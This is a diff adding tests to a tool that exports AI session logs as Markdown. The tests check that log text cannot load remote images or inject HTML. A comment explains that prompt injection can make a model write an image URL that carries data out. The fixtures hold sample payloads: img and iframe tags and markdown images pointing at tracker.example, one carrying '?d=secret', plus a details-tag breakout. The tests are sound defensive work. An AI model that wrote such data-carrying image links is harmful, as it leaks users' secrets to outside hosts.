@@ -2,7 +2,7 @@ import assert from 'node:assert/strict';
 import { test } from 'node:test';
 import { fmtDuration, fmtOffset, fmtTokens, fmtUSD, toolLabel } from '../src/format.js';
 import { sessionStats } from '../src/insights.js';
-import { exportMarkdown, fence } from '../src/markdown.js';
+import { exportMarkdown, fence, inert } from '../src/markdown.js';
 import { loadPricing } from '../src/pricing.js';
 import { redact, redactPaths, redactSecrets, redactSession } from '../src/redact.js';
 import { esc, exportHtml, searchPage } from '../src/render.js';
@@ -149,4 +149,62 @@ test('assistant text is rendered as Markdown, user text stays as typed', () => {
   const html = exportHtml(s, sessionStats(s, pricing));
   assert.match(html, /<div class="msg">keep \*\*this\*\* literal<\/div>/);
   assert.match(html, /<div class="msg md"><p class="mh">Plan<\/p><ul><li><strong>one<\/strong> <code>two<\/code><\/li><\/ul><p>&lt;img src=x/);
+});
+
+test('markdown export: log text cannot load images or inject HTML when the file is viewed', () => {
+  // Log text is untrusted (a prompt injection can make the model write an image URL carrying data out).
+  // A Markdown viewer (GitHub, an editor preview) would fetch it; the export keeps it as text instead.
+  const { a } = fixtureSessions();
+  const s: Session = {
+    ...a,
+    title: 'Fix <img src="https://tracker.example/t.png">',
+    project: '/p/`<img src=https://tracker.example/p.png>`',
+    orphanSubagents: [],
+    items: [
+      { kind: 'user', n: 0, ts: a.start, text: 'see <img src="https://tracker.example/u.png"> and </details><details open>' },
+      { kind: 'assistant', n: 1, ts: a.start, text: 'Done ![chart](https://tracker.example/a.png?d=secret) ![r][1]\n\n[1]: https://tracker.example/r.png\n\nUse `<b>` or:\n\n```html\n<div>kept as code</div>\n```\n\n1. Run:\n   ```sh\n   echo `<i>`\n   ```\n2. Then\n```\nopen <img src=x>', model: 'm', error: false },
+      { kind: 'system', n: 2, ts: a.start, text: 'warn <iframe src="https://tracker.example/f">', error: false },
+      { kind: 'system', n: 3, ts: a.start, text: '```\n<img src=x>\n```', error: true },
+    ],
+  };
+  const md = exportMarkdown(s, sessionStats(s, pricing));
+  assert.ok(!/<(img|iframe|details open)/i.test(md.replace(/^```\nopen <img src=x>\n```$/m, '').replace(/^> ```\n> <img src=x>\n> ```$/m, '')), md);
+  assert.match(md, /> \*\*Error:\*\*\n> ```\n> <img src=x>\n> ```/, 'the error mark does not stop a code block from being one');
+  assert.ok(!md.includes('!['), 'no image syntax left');
+  assert.match(md, /Done !\\\[chart\]\(https:\/\/tracker\.example\/a\.png\?d=secret\)/, 'the image stays readable as text');
+  assert.match(md, /&lt;img src="https:\/\/tracker\.example\/u\.png">/);
+  // Renderers disagree on which backticks pair up, so inline code holding '<' is written as <code> with entities.
+  assert.match(md, /Use <code>&#60;b&#62;<\/code> or:/);
+  assert.match(md, /- Session: `11111111-aaaa/, 'inline code without < is left alone');
+  assert.match(md, /```html\n<div>kept as code<\/div>\n```/, 'fenced code is left alone');
+  // Code blocks are written out again at column 0 with their own fence, so where they end cannot be argued about:
+  // an indented one is dedented, and one left open is closed before the next message.
+  assert.match(md, /1\. Run:\n```sh\necho `<i>`\n```\n2\. Then\n```\nopen <img src=x>\n```\n/);
+  assert.match(md, /- Project: <code>&#47;p&#47;&#96;&#60;img src&#61;https&#58;&#47;&#47;tracker&#46;example&#47;p&#46;png&#62;&#96;<\/code>/);
+});
+
+test('markdown export stays fast on long lines of backtick runs that never close', () => {
+  // Each unmatched run used to rescan the rest of the line: 3.5 s for this 1 MB line.
+  const line = Array.from({ length: 1400 }, (_, k) => '`'.repeat(k + 1)).join('a');
+  const t = performance.now();
+  assert.equal(inert(line), line);
+  inert('`` ` '.repeat(200_000));
+  assert.ok(performance.now() - t < 1500, `took ${Math.round(performance.now() - t)}ms`);
+});
+
+test('markdown export: a tool name or record label cannot end its <summary> HTML block early', () => {
+  // A blank line ends an HTML block in Markdown, and what follows would be read as Markdown: here, an image.
+  const { a } = fixtureSessions();
+  const img = '![t](https://tracker.example/n.png)';
+  const s: Session = {
+    ...a,
+    orphanSubagents: [],
+    items: [
+      { kind: 'tool', n: 0, ts: a.start, id: 't', name: `Bash\n\n${img}`, input: {}, output: 'ok', isError: false },
+      { kind: 'raw', n: 1, ts: a.start, label: `odd\n\n${img}`, json: '{}' },
+    ],
+  };
+  const md = exportMarkdown(s, sessionStats(s, pricing));
+  assert.match(md, /<summary>Tool: Bash !\[t\]\(https:\/\/tracker\.example\/n\.png\)<\/summary>/);
+  assert.match(md, /<summary>odd !\[t\]\(https:\/\/tracker\.example\/n\.png\)<\/summary>/);
 });
